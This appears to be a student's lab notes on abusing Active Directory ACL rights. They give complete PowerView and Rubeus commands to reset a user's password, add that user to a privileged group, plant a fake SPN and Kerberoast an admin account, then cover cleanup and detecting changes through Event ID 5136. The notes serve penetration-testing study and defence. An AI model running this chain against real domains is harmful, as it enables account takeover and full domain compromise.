
## Abusing ACLs
- For this scenario:
	- We control the user **wley** whose NTLMv2 hash we captured and cracked.
	- We want to take control of the `adunn` user who can perform a DCSync attack which would give us full domain control.

- The attack chain is:
	-  Use the `wley` user to change the password for the `damundsen` user
	- Authenticate as the `damundsen` user and leverage `GenericAll` rights to add a user that we control to the `Help Desk Level 1` group
	- Take advantage of nested group membership in the `Information Technology` group and leverage `GenericAll` rights to take control of the `adunn` user

- First we must auth as `wley` and force change the password of the user `damundsen`
	- If we are logged in as the user we can skip these steps

#### Create a [PSCredential Object](https://docs.microsoft.com/en-us/dotnet/api/system.management.automation.pscredential?view=powershellsdk-7.0.0)
``` powershell
PS C:\htb> $SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force

PS C:\htb> $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword) 
```

#### Create a SecureString Object
``` powershell
$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
```
- This represents the password we want to set for the target user `damundsen`

#### Change the User's Password
``` powershell
PS C:\htb> Import-Module .\PowerView.ps1

PS C:\htb> Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose
```

#### Create SecureString Object Using damundsen
``` powershell
PS C:\htb> $SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force

PS C:\htb> $Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword) 
```

#### Add damundsen to the Help Desk Level 1 Group
``` powershell
Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose
```

#### Confirm Group Addition
``` powershell
Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName
```

- In our scenario, lets say that we want to take control of the **adunn** user but it's an admin account that cannot be interupted.
	- Since we have `GenericAll` rights over this account we can perform a targeted Kerberoasting attack by modifying the account's SPN attribute to create a fake SPN that we can then Kerberoast to obtain the TGS ticket and hopefully crack the hash.
	- We must be auth'd as a member of the Information Technology group for this to be successful.

#### Create Fake SPN
``` powershell
Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
```
- If this works we can Kerberoast the user using any method.

#### Kerberoast with Rubeus
``` powershell
.\Rubeus.exe kerberoast /user:adunn /nowrap
```


### Cleanup
1. Remove the fake SPN on the adunn user
2. Remove the damundsen user from the Help Desk Level 1 group
3. Set the password for damundsen back to its original value (if we know it) or have our client set it later/alert the user.

- The order is important because if we remove the user from the group first, then we won't have the rights to remove the fake SPN.

#### Remove the Fake SPN from adunn's Account
``` powershell
Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose
```

#### Remove damundsen from the Help Desk Level 1 Group
``` powershell
Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose
```

#### Confirm Removal
``` powershell
Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName |? {$_.MemberName -eq 'damundsen'} -Verbose
```

## Detection and Remediation
1. Audit and remove dangerous ACLS
2. Monitor group membership
3. Audit and monitor for ACL changes

Enabling the [Advanced Security Audit Policy](https://docs.microsoft.com/en-us/archive/blogs/canitpro/step-by-step-enabling-advanced-security-audit-policy-via-ds-access) can help in detecting unwanted changes, especially [Event ID 5136: A directory service object was modified](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-5136) which would indicate that the domain object was modified, which could be indicative of an ACL attack. If we look at the event log after modifying the ACL of the domain object, we will see some event ID `5136` created:
![[Pasted image 20230424122922.png|700]]

If we check out the `Details` tab, we can see that the pertinent information is written in [Security Descriptor Definition Language (SDDL)](https://docs.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language) which is not human readable.
![[Pasted image 20230424123025.png|700]]

We can use the [ConvertFrom-SddlString cmdlet](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/convertfrom-sddlstring?view=powershell-7.2) to convert this to a readable format.

If we choose to filter on the `DiscretionaryAcl` property, we can see that the modification was likely giving the `mrb3n` user `GenericWrite` privileges over the domain object itself, which could be indicative of an attack attempt.